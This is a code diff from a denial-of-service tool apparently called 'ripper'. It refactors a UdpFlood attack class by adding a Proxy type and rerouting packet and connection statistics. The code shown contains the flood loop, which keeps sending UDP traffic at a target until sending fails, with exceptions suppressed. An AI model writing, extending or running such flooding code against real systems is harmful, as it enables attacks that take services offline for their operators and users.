@@ -7,6 +7,7 @@ from ripper.errors import *
 from ripper.context.target import Target
 from ripper.constants import *
 from ripper.actions.attack_method import AttackMethod
+from ripper.proxy import Proxy
 
 # Forward Reference
 Context = 'Context'
@@ -26,7 +27,7 @@ class UdpFlood(AttackMethod):
     _sock: socket
     _target: Target
     _ctx: Context
-    _proxy: Any = None
+    _proxy: Proxy = None
 
     def __init__(self, target: Target, context: Context):
         self._target = target
@@ -40,13 +41,13 @@ class UdpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as udp_conn:
-            self._ctx.target.statistic.connect.status_success()
+            self._target.statistic.connect.status_success()
             while self.sendto(udp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
-            self._ctx.target.statistic.connect.status_failed()
+            self._target.statistic.connect.status_failed()
             self._ctx.sock_manager.close_socket()
 
     def sendto(self, sock: socket) -> bool:
@@ -60,7 +61,7 @@ class UdpFlood(AttackMethod):
         except Exception as e:
             self._target.errors_manager.add_error(UdpSendError(message=e))
         else:
-            self._ctx.target.statistic.packets.status_sent(sent_bytes=sent)
+            self._target.statistic.packets.status_sent(sent_bytes=sent)
             self._ctx.remove_error(UdpSendError(message=GETTING_SERVER_IP_ERR_MSG).uuid)
             return True
 
